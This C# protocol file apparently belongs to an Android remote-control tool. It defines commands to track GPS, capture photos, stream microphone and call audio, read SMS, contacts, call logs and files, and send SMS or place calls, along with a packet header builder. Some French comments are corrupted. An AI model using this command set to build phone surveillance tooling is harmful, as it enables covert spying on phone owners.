using System.IO;
using InOut.Utils;

namespace InOut
{
    public class Protocol
    {
        public const int HeaderLengthData = 15;
        public const int MaxPacketSize = 204800;
               
        public const int PacketLost = 0;
        public const int NoMore = 1;
        public const int SizeError = 2;
        public const int AllDone = 3;
        public const int PacketDone = 4;
               
        //--- Cconste de connexion ---	
        public const short Debug = 0;
        public const short Error = 1;
        public const short Connect = 2;
        public const short EnvoiCmd = 3;
        public const short Infos = 4;
        public const short Disconnect = 5;
               
        //--- Cconstes de Pr�f�rences ---
        public const short SetPreference = 20;
        public const short GetPreference = 21;
               
        //--- Iconsttion Server -> Client(Telephone)
        private const short PInst = 100;
        public const short GetGps = PInst + 0;
        public const short GetGpsStream = PInst + 1; //String du Provider
        public const short StopGpsStream = PInst + 2; // -
               
        public const short GetPicture = PInst + 3; // -
               
        public const short GetSoundStream = PInst + 4; // Int source
        public const short StopSoundStream = PInst + 5; // -
               
        public const short GetVideoStream = PInst + 6; // Int source (pour api 8+)
        public const short StopVideoStream = PInst + 7;
               
        public const short GetBasicInfo = PInst + 8; // -
        public const short DoToast = PInst + 9; // String text
        public const short MonitorSms = PInst + 10; // filter (phone number) or (incoming/outgoing) ?
        public const short MonitorCall = PInst + 11; // idem
        public const short GetContacts = PInst + 12; // filter sim/phone ?
        public const short GetSms = PInst + 13; // filter (phone number) or (read/unread) or (received/sent)
        public const short ListDir = PInst + 14; // String path
        public const short GetFile = 115; // String path
        public const short GiveCall = PInst + 16;//String phonenumber
        public const short SendSms = PInst + 17; // String phonenumber, String message
        public const short GetCallLogs = PInst + 18; // -
        public const short StopMonitorSms = PInst + 19; // -
        public const short StopMonitorCall = PInst + 20; // -
        public const short GetAdvInformations = PInst + 21; // -
        public const short OpenBrowser = PInst + 22; // String url
        public const short DoVibrate = PInst + 23; // long millisec
        public const short ListenPhone = PInst + 24;
        // emaiconst
               
        //--- Rconst Client -> Server
        private const short PRep = 200;
        public const short DataGps = PRep + 0;
        public const short DataGpsStream = PRep + 1;
        public const short DataPicture = PRep + 2;
        public const short DataSoundStream = PRep + 3;
        public const short DataVideoStream = PRep + 4;
        public const short DataBasicInfo = PRep + 5;
        public const short AckToast = PRep + 6;
        public const short DataMonitorSms = PRep + 7;
        public const short DataMonitorCall = PRep + 8;
        public const short DataContacts = PRep + 9;
        public const short DataSms = PRep + 10;
        public const short DataListDir = PRep + 11;
        public const short DataFile = PRep + 12;
        public const short AckGiveCall = PRep + 13;
        public const short AckSendSms = PRep + 14;
        public const short DataCallLogs = PRep + 15;
              
        public const int ArgStreamAudioMic = 1;
        public const int ArgStreamAudioUpdownCall = 4;
        public const int ArgStreamAudioUpCall = 2;
        public const int ArgStreamAudioDownCall = 3;
               
        public const string KeySendSmsNumber = "number";
        public const string KeySendSmsBody = "body";


        public static byte[] DataHeaderGenerator(int totalLenght, int localLength, bool moreF, short idPaquet, int channel)
        {
            var header = new byte[HeaderLengthData];
            var memoryStream = new MemoryStream(header);

            memoryStream.WriteInt32(totalLenght);
            memoryStream.WriteInt32(localLength);

            if (moreF)
                memoryStream.WriteByte(1);
            else
                memoryStream.WriteByte(0);
            memoryStream.WriteShort(idPaquet);
            memoryStream.WriteInt32(channel);
            memoryStream.Close();

            return header;
        }
    }

}
